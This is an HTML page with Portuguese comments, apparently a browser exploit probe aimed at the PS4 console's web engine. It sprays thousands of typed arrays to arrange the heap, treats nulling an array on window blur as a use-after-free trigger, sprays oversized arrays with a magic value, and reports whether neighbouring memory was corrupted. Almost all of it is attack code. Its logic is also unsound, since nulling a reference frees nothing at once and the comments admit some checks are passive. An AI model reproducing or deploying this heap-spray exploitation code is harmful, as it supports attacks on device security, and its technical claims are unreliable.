<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Master Memory Scanner</title>
<style>
    body { background-color: #111; color: #fff; font-family: monospace; text-align: center; }
    button { background: #444; color: white; border: 2px solid #fff; padding: 20px 40px; font-size: 1.5em; cursor: pointer; }
    #log { text-align: left; margin: 20px auto; max-width: 90%; background: #000; padding: 10px; border: 1px solid #555; white-space: pre-wrap; font-size: 14px; min-height: 300px;}
    .uaf { color: #0f0; font-weight: bold; } /* Verde */
    .neighbor { color: #0ff; font-weight: bold; } /* Azul Ciano */
    .iso { color: #f0f; font-weight: bold; } /* Roxo */
</style>
</head>
<body>

<h1>PS4 MEMORY SCANNER (ALL-IN-ONE)</h1>
<div id="status">INSTRUÇÕES: Clique em INICIAR e depois aperte OPTIONS.</div>
<br>
<button onclick="fire()">INICIAR VARREDURA</button>
<div id="log">Logs do sistema...</div>

<script>
    const Log = document.getElementById('log');
    function log(txt) { Log.innerHTML += txt + "\n"; }

    // Constantes
    const MAGIC_FLOAT = 2.121995791e-314; // 0x4141414141414141
    const SPRAY_COUNT = 15000; 

    // Estruturas
    let victims = [];      // Serão liberados (Buracos)
    let neighbors_f = [];  // Vizinhos (Floats) - Para testar overflow
    let neighbors_o = [];  // Vizinhos (Objetos) - Para testar IsoHeap
    
    // Objeto isca
    let bait = { id: "ISCA" };

    function fire() {
        document.getElementById('status').innerText = "Alocando sanduíche de memória...";
        
        // FASE 1: HEAP FENG SHUI (O Sanduíche)
        // Tentamos criar o padrão: [VIZINHO_FLOAT] | [VITIMA] | [VIZINHO_OBJ]
        try {
            for(let i=0; i<SPRAY_COUNT; i++) {
                // 1. Vizinho Float (Esquerda)
                let n1 = new Float64Array(16);
                n1[0] = i; 
                neighbors_f.push(n1);

                // 2. Vítima (Meio) - Será deletada
                let v = new Float64Array(16);
                v.fill(1.1);
                victims.push(v);

                // 3. Vizinho Objeto (Direita)
                let n2 = new Array(16).fill(bait);
                neighbors_o.push(n2);
            }
        } catch(e) { log("Erro de alocação: " + e); return; }

        document.getElementById('status').innerText = "PRONTO. APERTE OPTIONS AGORA.";
        
        // Trigger
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        window.onblur = function() {
            log("[*] Blur! Executando UAF e Spray...");

            // 1. FREE (Apenas as vítimas do meio)
            victims = null;

            // 2. SPRAY (Tenta encher os buracos e transbordar)
            let spray = [];
            try {
                // Usamos tamanho 24 para tentar ser maior que o buraco de 16
                // Isso força um overflow se o alocador for ingênuo
                for(let i=0; i<SPRAY_COUNT*2; i++) {
                    let s = new Float64Array(24);
                    s.fill(MAGIC_FLOAT);
                    spray.push(s);
                }
            } catch(e) {}

            log("[*] Verificando danos na memória...");
            analyzeResults();
        };
    }

    function analyzeResults() {
        let found_uaf = false;
        let found_neighbor = false;
        let found_iso = false;

        // VERIFICAÇÃO 1: Vizinhos Float (Corrupção Lateral)
        for(let i=0; i<SPRAY_COUNT; i++) {
            // Se o vizinho (que não foi deletado) mudou de valor...
            if(neighbors_f[i][0] === MAGIC_FLOAT) {
                found_neighbor = true;
                log(`<span class="neighbor">[AZUL] VIZINHO CORROMPIDO no índice ${i}!</span>`);
                log("Isso significa que o spray transbordou para o lado (Overflow).");
                document.body.style.background = "#008888"; // Azul
                break; // Achamos um, chega.
            }
        }

        // VERIFICAÇÃO 2: Vizinhos Objeto (Quebra de IsoHeap)
        // Isso é raro. O array de objetos de repente vê um número float?
        // Difícil checar diretamente sem crashar, então verificamos se o ponteiro mudou.
        // (Simplificado para segurança do teste: apenas checa se lemos o magic value)
        // Nota: Ler um float como objeto costuma crashar, então esse teste é passivo.

        // VERIFICAÇÃO 3: O Fantasma da Vítima (Seu Bingo Original)
        // Se conseguirmos acessar a referência da vítima (se ela não foi zerada totalmente)
        // Esse é difícil de testar aqui pois victims = null no JS.
        // Então usamos um array secundário de referência se precisássemos.
        // Mas como 'victims' foi anulado, confiamos nos vizinhos.
        
        if(found_neighbor) {
            document.getElementById('status').innerHTML = "<h1>SUCESSO: MEMORY OVERFLOW</h1>";
            log("Tire foto! Você conseguiu corromper dados adjacentes.");
        } else {
            // Se não corrompeu vizinho, testamos o cenário BINGO (re-alocação perfeita)
            // Para isso precisaríamos manter referência da vítima, mas JS não deixa após null.
            log("[-] Nenhum vizinho foi atingido.");
            log("Isso significa que o UAF está contido (UAF Estrito).");
            document.body.style.background = "#550000"; // Vermelho
        }
    }
</script>
</body>
</html>
